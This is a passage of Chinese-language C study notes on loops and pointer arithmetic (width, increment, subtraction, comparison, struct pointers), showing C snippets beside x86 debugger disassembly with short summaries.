mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D9B9 83 C1 01             add         ecx,1</span></span><br><span class=\"line\"><span class=\"function\">0040D9BC 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D9BF EB DE                jmp         func3+1<span class=\"title\">Fh</span> <span class=\"params\">(<span class=\"number\">0040</span>d99f)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9C1 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C2 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C3 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D9C4 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D9C7 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D9C9 E8 F2 37 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9CE 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D0 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D1 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func4</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">while</span>(i&lt;=<span class=\"number\">10</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D980 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D981 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D983 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D986 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D987 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D988 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D989 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D98C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D991 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D996 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D998 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D99F <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A3 <span class=\"number\">7F</span> <span class=\"number\">1</span>C                jg          func3+<span class=\"number\">41</span>h (<span class=\"number\">0040</span>d9c1)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A5 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A8 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A9 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9AE E8 <span class=\"number\">8</span>D <span class=\"number\">37</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9B3 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D9B6 8B 4D FC             mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D9B9 83 C1 01             add         ecx,1</span></span><br><span class=\"line\"><span class=\"function\">0040D9BC 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D9BF EB DE                jmp         func3+1<span class=\"title\">Fh</span> <span class=\"params\">(<span class=\"number\">0040</span>d99f)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9C1 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C2 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C3 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D9C4 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D9C7 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D9C9 E8 F2 37 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9CE 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D0 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D1 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"指针\"><a class=\"markdownIt-Anchor\" href=\"#指针\">#</a> 指针</h3>\n<p>总结:<br>\n1、带有 <code>*</code>  的变量类型的标准写法: <code>变量类型* 变量名</code></p>\n<p>2、任何类型都可以带 <code>*</code>  加上 <code>*</code>  以后是新的类型</p>\n<p>3、* 可以是任意多个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//赋值</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Stu</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\">\tStu* stu;</span><br><span class=\"line\">\t<span class=\"type\">int</span>** a;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">3</span>;</span><br><span class=\"line\">\tstu = (Stu*)<span class=\"number\">4</span>;</span><br><span class=\"line\">\ta = (<span class=\"type\">int</span>**)<span class=\"number\">5</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743 <span class=\"number\">83</span> EC <span class=\"number\">54</span>             sub         esp,<span class=\"number\">54</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D746 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749 <span class=\"number\">8</span>D <span class=\"number\">7</span>D AC             lea         edi,[ebp<span class=\"number\">-54</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C B9 <span class=\"number\">15</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">15</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D751 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D756 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758 C7 <span class=\"number\">45</span> FC <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75F C7 <span class=\"number\">45</span> F8 <span class=\"number\">02</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-8</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D766 C7 <span class=\"number\">45</span> F4 <span class=\"number\">03</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-0</span>Ch],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76D C7 <span class=\"number\">45</span> F0 <span class=\"number\">04</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-10</span>h],<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D774 C7 <span class=\"number\">45</span> EC <span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-14</span>h],<span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//带*类型变量赋值必须使用完整写法</span></span><br><span class=\"line\"><span class=\"comment\">//不加家多少个*，宽度永远是4字节</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//++/--加多少取决于类型减去一个*之后的数据宽度</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func2</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">3</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tx++;</span><br><span class=\"line\">\ty++;</span><br><span class=\"line\">\tz++;</span><br><span class=\"line\">\t<span class=\"comment\">//2,4,7</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span>** x1;</span><br><span class=\"line\">\t<span class=\"type\">short</span>** y1;</span><br><span class=\"line\">\t<span class=\"type\">int</span>** z1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx1 = (<span class=\"type\">char</span>**)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty1 = (<span class=\"type\">short</span>**)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz1 = (<span class=\"type\">int</span>**)<span class=\"number\">3</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tx1++;</span><br><span class=\"line\">\ty1++;</span><br><span class=\"line\">\tz1++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x1,y1,z1);</span><br><span class=\"line\">\t<span class=\"comment\">//5,6,7</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\ty+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\tz+=<span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);  <span class=\"comment\">//105 110 120</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span>**** x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>**** y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>**** z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\ty+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\tz+=<span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);  <span class=\"comment\">//120,120,120</span></span><br><span class=\"line\">总结:</span><br><span class=\"line\"><span class=\"number\">1.</span>带*类型的变量可以加、减一个整数，但不能乘或者除.</span><br><span class=\"line\"><span class=\"number\">2.</span>带*类型变量与其他整数相加或者相减时:</span><br><span class=\"line\"><span class=\"comment\">//带*类型变量＋N=带*类型变量+N(去掉一个*后类型的宽度)</span></span><br><span class=\"line\"><span class=\"comment\">//带*类型变量一N=带*类型变量–N(去掉一个*后类型的宽度)</span></span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\tchar**** x;</span><br><span class=\"line\">\tchar**** y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (char****)200;</span><br><span class=\"line\">\ty = (char****)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y; </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a);  //25</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tchar* x;</span><br><span class=\"line\">\tchar* y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (char*)200;</span><br><span class=\"line\">\ty = (char*)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y;  //*相减结果为int</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a); //100</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tshort* x;</span><br><span class=\"line\">\tshort* y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (short*)200;</span><br><span class=\"line\">\ty = (short*)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y; </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a);   //50</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">总结:</span><br><span class=\"line\">1、两个类型相同的带*类型的变量可以进行减法操作</span><br><span class=\"line\">2、想减的结果要除以去掉一个*的数据的宽度.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//带*的类型可以做大小比较</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tshort**** x;</span><br><span class=\"line\">\tshort**** y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (short****)200;</span><br><span class=\"line\">\ty = (short****)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif(x&gt;y)</span><br><span class=\"line\">\t\tprintf(&quot;1&quot;);    //1</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\tprintf(&quot;2&quot;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char** arr[10]    //40</span><br><span class=\"line\">0040D740 55                   push        ebp</span><br><span class=\"line\">0040D741 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D743 83 EC 68             sub         esp,68h    //0x68-0x40=0x28=40/4=10</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\">Student**** s;</span><br><span class=\"line\">s = (Student****)100;</span><br><span class=\"line\">s++;  //104</span><br><span class=\"line\">s += 2;  //112</span><br><span class=\"line\">s -= 3;  //100</span><br><span class=\"line\">s += 2.5;  //pointer on left; needs integral value on right</span><br><span class=\"line\"></span><br><span class=\"line\">Student**** s1;</span><br><span class=\"line\">Student**** s2;</span><br><span class=\"line\">int x;</span><br><span class=\"line\">s1 = (Student****)200;</span><br><span class=\"line\">s2 = (Student****)100;</span><br><span class=\"line\">x = s1-s2;  //25</span><br><span class=\"line\"></span><br><span class=\"line\">Student* s;</span><br><span class=\"line\">s = (Student*)100;</span><br><span class=\"line\">s++;  //108</span><br><span class=\"line\">s+=2;  //124</span><br><span class=\"line\">s-=3;  //100</span><br><span class=\"line\"></span><br><span class=\"line\">Student* s1;</span><br><span class=\"line\">Student* s2;</span><br><span class=\"line\">int x;</span><br><span class=\"line\">s1 = (Student*)200;</span><br><span class=\"line\">s2 = (Student*)100;</span><br><span class=\"line\">x=s1-s2  //12</span><br><span class=\"line\"></span><br><span class=\"line\">void func2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">#if 0</span><br><span class=\"line\">\tStudent**** s;</span><br><span class=\"line\">\ts = (Student****)100;</span><br><span class=\"line\">\ts++;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts += 2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts -= 3; </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent**** s1;</span><br><span class=\"line\">\tStudent**** s2;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\ts1 = (Student****)200;</span><br><span class=\"line\">\ts2 = (Student****)100;</span><br><span class=\"line\">\tx = s1-s2; </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent* s;</span><br><span class=\"line\">\ts = (Student*)100;</span><br><span class=\"line\">\ts++;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts+=2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts-=3;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent* s1;</span><br><span class=\"line\">\tStudent* s2;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\ts1 = (Student*)200;</span><br><span class=\"line\">\ts2 = (Student*)100;</span><br><span class=\"line\">\tx=s1-s2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\"></span><br><span class=\"line\">\t#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Student**** 4</span><br><span class=\"line\">Student* 8</span><br><span class=\"line\"></span><br><span class=\"line\">Student s;</span><br><span class=\"line\">int x = (Studnet)s;   //x</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Student 